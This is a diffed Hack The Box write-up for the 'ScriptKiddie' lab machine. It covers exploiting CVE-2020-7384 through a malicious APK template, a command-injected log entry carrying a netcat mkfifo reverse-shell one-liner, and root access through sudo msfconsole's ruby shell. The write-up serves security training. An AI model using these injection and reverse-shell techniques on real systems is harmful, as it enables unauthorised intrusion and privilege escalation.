@@ -1,7 +1,22 @@
 ## Hackthebox.eu - ScriptKiddie
+**February 7th, 2021**
 
-## Enumeration
-### nmap
+This box was a web hosted script kiddies tool set. Utilizing known CVEs within the security tools it called on the back-end, we can get a reverse shell. From there we can abuse a poorly secured cronjob, to move laterally to another user who has password-less sudo configured for a tool that allows us to run commands.
+
+### Quick Summary
+* Craft a malicious android APK template for metasploit
+* Upload template to the web front end and get a reverse shell
+* Modify a log file to do bash command injection to get a second reverse shell
+* Launch msfconsole with sudo, and drop to a ruby shell
+* Read out the flag from ruby
+
+
+#### Tools requried
+Nothing fancy. a standard Ubuntu desktop should have everything you need by default
+
+### Detailed steps
+#### Port Scan
+A portscan revealed a python web server on port 5000 and an active sshd service both running on an Ubuntu box of some kind.
 ```bash
 $ nmap -sC -sV -oA nmap/init 10.10.10.226
 
@@ -24,74 +39,60 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sun Feb  7 11:01:18 2021 -- 1 IP address (1 host up) scanned in 9.43 seconds
 ```
 
-### gobuster
-I didn't find gobuster useful for this box, but I ran it in the backround as I traversed the web server
 
-### Manual traversal
-Run burp suite for scope history and traverse the web page to record requests and responses as per usual.
+#### Web Server (:5000)
+This web server was a front end to a bunch of hacking tools. Here's how it was laid out
 
+* **nmap**: Puts the given IP into an nmap command and outputs the result. The input seems to be regex'd for IPs and I couldn't find any injection that worked.
+* **sploits**: Searches for exploits by your given string. I tried command injection but it gives a warning that they will hack you back. This turns out to be important for getting root later.
+* **payloads**: Generates meterpreter binaries for different platforms with an optional template. Only Android and windows seemed to work, while Linux threw an error.
 
-## Owning user
-### Web server description
-There were three forms on the web server
+##### CVE-2020-7384 (msfvenom APK template command injection)
+The metasploit templates are binaries that are used as a frame to inject your payload into. Normally, you can use custom templates to help evade anti-virus and intrusion detection systems.
 
-#### nmap
-Puts the given IP into an nmap command and outputs the result. The input seems to be regex'd for IPs and I couldn't find any injection that worked.
+This CVE references the ability to gain command injection by crafting malicious APK templates for an android platform. I found a proof of concept for this attack, but it had a few issues I had to overcome. The resulting PoC I used can be found here: https://gist.github.com/lungdart/2aa3673a872e386ea5ddc36186727711
 
-#### sploits
-Searches for exploits by your given string. I tried command injection but it gives a warning that they will hack you back. This turns out to be important for getting root later.
-
-#### payloads
-This one was more interesting off the bat. I'm not very familiar with metasploit, but it seems to generate meterpreter binaries in a tcp reverse shell. There's an option for you to upload a template, and to choose which operating system to generate binaries for. Only Android and windows seemed to work, while linux through an error.
-
-1. The linux error was a rabit hole that I went down trying to find a way to exploit my inputs to get more data back. I had no success.
-
-2. Creating a binary gave you a download link. This link never changed and seemed to be an md5 sum of some kind. I didn't find anything with directory traversal or filename manipulation.
-
-3. I didn't think any traditional upload strategies would work, as I'm familiar with python web servers, and the only easy vuln you'l find are template injections, but I didn't think that applied here.
-
-4. I had a hard time figuring out what metasploit templates where, but it seems you can do code injection into an existing executable to build trojan horses with it. You upload an existing binary and it would put a tcp reverse shell meterpreter session into it, and give you a download link. I found CVE-2020-7384 which is a reference to this exact metasploit function having a vuln while generating android APKs. If you crafted a malicious APK you could get code execution.
-
-### Web service exploitation
-Found a proof of concept at https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md
-
-This PoC wouldn't work when I changed to an openbsd style netcat reverse shell. Seems to be an error with base64 decoding a *+* character, so I changed it to base32 to remove the offender. I then uploaded this apk as an adroid template in the web form, and got a reverse shell.
-
-Once I was in user, there was an existing ssh key, which I stole to have a more stable connection to the box
-
+I used this tool to generate a malicious APK file, and uploaded it to the *payloads* section of the form. Listening with netcat gave me a reverse shell as the user ```kid```
 ```bash
 kid@scriptkiddie:~/logs$ id
 uid=1000(kid) gid=1000(kid) groups=1000(kid)
 ```
 
+Once I was in as the ```kid``` user, There was an existing SSH key that I stole to stabilize my connection to the box.
 
-## User traversal
-### Enumeration
-Ran linpeas in the background
+#### Privilege escalation to pwn
+##### kid's home directory
+```kid```'s home directory contain the source code for the website. The code for the searchsploit section showed that an attempt at command execution would have your IP written to the log file ```/home/kid/logs/hackers```, which was empty
 
-Linpeas revealed there was another user, **pwn**.
+```bash
+kid@scriptkiddie:~$ cat logs/hackers
 
-### Manual enumeration
-#### Kids home directory
-Had a look in **kid**'s home directory and got access to the web app. The source code indicated that when the regex for the searchsploit failed, it would write the timestamp and IP into a log file ```logs/hackers```
+```
 
-Looking into this file showed it was empty. I decided to tail the file for new output, and crafted a hacking attempt from the web front end. I got the warning and a curious result at the terminal. The output was there as expected, but it was immediatly truncated. Some service was monitoring that file and working with it.
+Taking a look at the home directory itself shows another user named ```pwn```
 
-#### Pwns home directory
-**pwn** had a suspicious shell script that I had read access to called ```scanlosers.sh```. This script seemed to check the hackers log file, and run nmaps on the target and recording the output. After it did this it would erase the file contents.
+##### pwn's home directory
+``pwn`` had a suspicious shell script that I had read access to called ```scanlosers.sh```. This script seemed to check the hackers log file from ```kid```'s home directory, and run nmaps on the target and recording the output. After it did this it would erase the file contents. Looking around showed that this script was running extremely often.
 
-### Exploitation
-The ```scanlosers.sh``` script assummed the IP coming in from the log file was trusted. But since I had write access to the log file, I crafted a malicious line that had command injection in the IP: ```[2021-02-07 17:57:52.187031] 1.1.1.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 5051 >/tmp/f;```. I then had a listener opened and waited for the remote shell, and I was in as **pwn**.
+Because we had write access to ```/home/kid/logs/hackers```, we could craft an evil entry, that contained command injection instead of an IP. Then when the system ran ```/home/pwn/scanlosers.sh``` it would run my command as the ```pwn``` user, and give me a reverse shell as them. The evil log entry I came up with was ```[2021-02-07 17:57:52.187031] 1.1.1.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 5051 >/tmp/f;```. I ran a netcat listener and put that into the log file, and immediately was gifted with a second reverse shell.
 
-Since there were ssh keys set up for **kid** I looked right away for keys for **pwn** which were available. I also grabbed them to ensure I had an easy connection.
+#### Privilege escalation to root
+Checking sudo shows that the ```pwn``` user has password-less sudo access for the msfconsole tool.
+```bash
+pwn@scriptkiddie:~$ sudo -l
+User pwn may run the following commands:
+    (root) NOPASSWD: /usr/bin/msfconsole
+```
 
-## Owning root
-### Enumeration
-On a whim I decided to check for sudo perissions on **pwn** before doing anything, and got a positive result to run ```msfconsole``` with no password. I immediatly ran it.
+since msfconolse has an interactive ruby interpreter built in, we can launch that, then exec commands to read out the flag.
+```bash
+pwn@scriptkiddie:~$ sudo msfconsole
+msf > irb
+[*] Starting IRB shell...
+```
 
-### Exploitation
-Now I'm not very familiar with metasploit, so I wasn't sure how to get a local shell, and my google-fu was sub par for this task (Getting remote shells is the entire purpose of this program! You try looking up how to drop to a local shell!).
+```ruby
+echo `cat /root/root.txt`
+```
 
-Having a quick look at the commands though, I found one that dropped to a ruby based scripting language. I immediatly ran that command and was given an interpreter command line. My next step was googling how to run system commands with ruby, and it was as simple as surrounding them with back ticks like in bash.
-
-I ran ```cat /root/root.txt``` directly and got the flag. Never bothering to even stabilize the shell.
+I submitted the flag and finished the box!
